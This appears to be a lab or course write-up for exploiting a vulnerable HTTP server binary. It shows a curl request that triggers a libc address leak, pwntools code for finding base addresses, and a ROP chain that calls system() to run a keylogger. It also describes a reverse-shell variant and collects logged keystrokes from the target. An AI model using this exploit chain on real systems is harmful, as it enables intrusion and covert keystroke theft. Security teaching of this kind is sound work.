# <span style="color: yellow;">Scenario 4</span>

## Context
***
- server_data is <span style="color: green;">accessible</span>
- stack canaries are <span style="color: red;">disabled</span>
- DEP is <span style="color: green;">enabled</span>
- ASLR is <span style="color: green;">enabled</span>

## Exploit overview
***
This exploit launches ./server_data. DEP stops code injection but not code-reuse, so we will use Return-Oriented Programming. ASLR is enabled so we need to leak a libc address using the vulnerability in POST. 
```shell
curl http://{TARGET}:{TARGET_PORT}/data.txt -XPOST -H "Content-Length: 200000" -d "data=hallo"
```
- If we have access to the `server_data` folder, we can just execute the keylogger with the ROP chain. (method_1 folder)
- If we **don't** have access to the `server_data` folder, we can spawn a reverse shell with the ROP chain, curl the keylogger, and execute the keylogger. (method_2 folder)

## Challenges & Decisions
***
- We can rename the keylogger to a string already present in the binary, and retrieve the address of that string. We need the base address of the ELF for this.


- ASLR makes ROP harder, but it does not prevent it if the attacker can get a leak.
  + There is no randomization within libraries.
  + If we discover one pointer pointing to a libc entry we know the entire layout of the libc.

- You can find out which shared libraries are used with:
```shell
$ readelf -d server_sc4
```
or in pwndbg in GDB:
```shell
$ vmmap
```
We will use ```libc.so.6``` to build a ROP chain, after we calculated the base address of the libc.

### Obtaining base addresses
We know ```libc.so.6``` is used, so we can print out the addresses of the symbols.
```py
libc = ELF('libc.so.6')
for symbol in libc.symbols:
    print(f"{symbol}: {hex(libc.symbols[symbol])}")
```
We observe that these symbols appear in the leaked addresses. Since the last part of the address remains constant, we can select one symbol and subtract its libc offset to determine the base address of libc.
```py
elf = ELF('server_sc4')
for symbol in elf.symbols:
    print(f"{symbol}: {hex(elf.symbols[symbol])}")
```
In the same way, we obtain the base address of the ELF.
We can use this base address to obtain the address of "./server_data".
### ROP Chain
```shell
g = pwn.p64(rop.find_gadget(["pop rdi", "ret"])[0])
payload = [
    g, pwn.p64(keylogger_adres), # pop "./server_data" in rdi
    pwn.p64(libc.sym.system)     # system("./server_data")
]
```

## Execution Instructions
***
Victim-side:
```shell
$ sudo ./launch_scenario 4
```
```shell
$ sudo cp keylogger server/server_data/server_data  
```
Attacker-side: Make sure ```libc.so.6``` is in the same directory as the exploit.
```shell
$ python3 server_sc4.py TARGET_IP TARGET_PORT
```
```shell
$ curl http://{TARGET}:{TARGET_PORT}/logged_keyboard_events.txt
```

## Preventive Measures
***
- Safer alternatives like ```snprintf``` should be used.
- Prevent leaks. Patch the vulnerability in POST.